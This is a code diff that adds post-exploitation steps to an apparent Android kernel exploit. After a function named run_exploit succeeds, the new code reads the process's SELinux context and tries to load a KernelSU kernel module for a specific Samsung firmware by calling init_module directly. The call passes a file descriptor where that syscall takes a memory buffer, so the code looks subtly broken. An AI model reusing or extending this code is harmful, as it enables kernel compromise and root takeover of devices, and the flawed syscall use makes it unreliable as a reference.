@@ -616,5 +616,22 @@ int run_exploit(int argc, char **argv) {
     pr_success("stability keeper pid=%d retaining reclaimed kernel pages\n",
                keeper);
   }
+    if (exploit_ok) {
+    // Test if we can load the module from the root process
+    FILE *f = fopen("/proc/self/attr/current", "r");
+    char ctx[256] = {0};
+    if (f) { fgets(ctx, sizeof(ctx), f); fclose(f); }
+    pr_info("post-exploit context: %s", ctx);
+    
+    // Try loading the module directly
+    int fd = open("/data/local/tmp/android14-6.1_kernelsu-essi-S731BXXU6BZDP-kdp.ko", O_RDONLY);
+    if (fd >= 0) {
+      int ret = syscall(__NR_init_module, fd, "", NULL);
+      pr_info("init_module ret=%d errno=%d\n", ret, errno);
+      close(fd);
+    } else {
+      pr_info("failed to open .ko errno=%d\n", errno);
+    }
+  }
   return exploit_ok ? 0 : 1;
 }
